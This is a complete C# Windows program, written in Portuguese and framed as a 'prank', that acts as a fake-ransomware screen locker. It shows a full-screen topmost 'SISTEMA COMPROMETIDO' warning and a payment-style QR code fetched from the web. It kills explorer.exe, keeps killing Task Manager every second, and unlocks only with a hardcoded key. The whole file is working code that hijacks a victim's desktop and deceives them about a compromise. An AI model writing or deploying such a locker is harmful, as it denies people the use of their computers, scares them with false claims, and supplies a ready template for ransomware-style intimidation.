using System;
using System.Drawing;
using System.Windows.Forms;
using System.Diagnostics;
using System.Runtime.InteropServices;
using System.Net;
using System.IO;

public class TrolagemHacker : Form
{
    private TextBox txtChave;
    private Button btnDesbloquear;
    private System.Windows.Forms.Timer timerProtecao;
    private const string CHAVE_CORRETA = "123";
    
    // Links das imagens fornecidos por você
    private const string URL_HACKER = "https://i.ibb.co/NgkJFxH8/ASA.png";
    private const string URL_QRCODE = "https://codigosdebarrasbrasil.com.br/wp-content/uploads/2019/09/codigo_qr-300x300.png";

    [DllImport("user32.dll")]
    private static extern bool SetForegroundWindow(IntPtr hWnd);

    public TrolagemHacker()
    {
        // Configurações da Janela de Bloqueio Total
        this.BackColor = Color.Black;
        this.FormBorderStyle = FormBorderStyle.None;
        this.WindowState = FormWindowState.Maximized;
        this.TopMost = true;
        this.ShowInTaskbar = false;

        int screenWidth = Screen.PrimaryScreen.Bounds.Width;
        int screenHeight = Screen.PrimaryScreen.Bounds.Height;

        // Título Principal
        Label lblTitulo = new Label();
        lblTitulo.Text = "SISTEMA COMPROMETIDO";
        lblTitulo.ForeColor = Color.Red;
        lblTitulo.Font = new Font("Courier New", 36, FontStyle.Bold);
        lblTitulo.AutoSize = true;
        lblTitulo.Location = new Point((screenWidth - 600) / 2, 360);
        this.Controls.Add(lblTitulo);

        // Texto de Trolagem com Avisos
        Label lblTexto = new Label();
        lblTexto.Text = "Ola, irmao. Seu computador foi bloqueado porque voce nao para de mexer onde nao deve!\n\n" +
                        "AVISO: NAO TENTE REINICIAR OU FECHAR ESTA JANELA.\n" +
                        "O GERENCIADOR DE TAREFAS FOI DESATIVADO.";
        lblTexto.ForeColor = Color.Lime;
        lblTexto.Font = new Font("Courier New", 12, FontStyle.Bold);
        lblTexto.TextAlign = ContentAlignment.MiddleCenter;
        lblTexto.Size = new Size(800, 100);
        lblTexto.Location = new Point((screenWidth - 800) / 2, 450);
        this.Controls.Add(lblTexto);

        // Campo da Chave
        txtChave = new TextBox();
        txtChave.PasswordChar = '*';
        txtChave.Font = new Font("Arial", 20);
        txtChave.TextAlign = HorizontalAlignment.Center;
        txtChave.Size = new Size(200, 40);
        txtChave.Location = new Point((screenWidth - 200) / 2, 730);
        this.Controls.Add(txtChave);

        // Botão de Desbloqueio
        btnDesbloquear = new Button();
        btnDesbloquear.Text = "DESBLOQUEAR";
        btnDesbloquear.BackColor = Color.Lime;
        btnDesbloquear.FlatStyle = FlatStyle.Flat;
        btnDesbloquear.Font = new Font("Arial", 12, FontStyle.Bold);
        btnDesbloquear.Size = new Size(200, 50);
        btnDesbloquear.Location = new Point((screenWidth - 200) / 2, 780);
        btnDesbloquear.Click += (s, e) => VerificarChave();
        this.Controls.Add(btnDesbloquear);

        // --- DOWNLOAD E EXIBIÇÃO DAS IMAGENS ---
        using (WebClient client = new WebClient())
        {
            try {
                // Imagem do Hacker no Topo
                byte[] imgData = client.DownloadData(URL_HACKER);
                PictureBox pbHacker = new PictureBox();
                using (var ms = new MemoryStream(imgData)) { pbHacker.Image = Image.FromStream(ms); }
                pbHacker.SizeMode = PictureBoxSizeMode.Zoom;
                pbHacker.Size = new Size(300, 300);
                pbHacker.Location = new Point((screenWidth - 300) / 2, 50);
                this.Controls.Add(pbHacker);
            } catch { }

            try {
                // QR Code no Centro
                byte[] qrData = client.DownloadData(URL_QRCODE);
                PictureBox pbQR = new PictureBox();
                using (var ms = new MemoryStream(qrData)) { pbQR.Image = Image.FromStream(ms); }
                pbQR.SizeMode = PictureBoxSizeMode.Zoom;
                pbQR.Size = new Size(150, 150);
                pbQR.Location = new Point((screenWidth - 150) / 2, 560);
                this.Controls.Add(pbQR);
            } catch { }
        }

        // Timer de Proteção Infinita
        timerProtecao = new System.Windows.Forms.Timer();
        timerProtecao.Interval = 1000;
        timerProtecao.Tick += (s, e) => {
            // Fecha o Gerenciador de Tarefas se ele tentar abrir
            foreach (var p in Process.GetProcessesByName("taskmgr")) try { p.Kill(); } catch {}
            // Força a janela a ficar na frente sempre
            SetForegroundWindow(this.Handle);
        };
        timerProtecao.Start();

        // Desativa o Windows Explorer no início
        foreach (var p in Process.GetProcessesByName("explorer")) try { p.Kill(); } catch {}
    }

    private void VerificarChave()
    {
        if (txtChave.Text == CHAVE_CORRETA)
        {
            timerProtecao.Stop();
            Process.Start("explorer.exe"); // Restaura o Windows
            MessageBox.Show("SISTEMA RESTAURADO COM SUCESSO!", "DESBLOQUEADO", MessageBoxButtons.OK, MessageBoxIcon.Information);
            Application.Exit();
        }
        else
        {
            MessageBox.Show("CHAVE INCORRETA! O SISTEMA CONTINUARA BLOQUEADO.", "ERRO DE ACESSO", MessageBoxButtons.OK, MessageBoxIcon.Error);
            txtChave.Clear();
        }
    }

    [STAThread]
    public static void Main()
    {
        Application.EnableVisualStyles();
        Application.Run(new TrolagemHacker());
    }
}
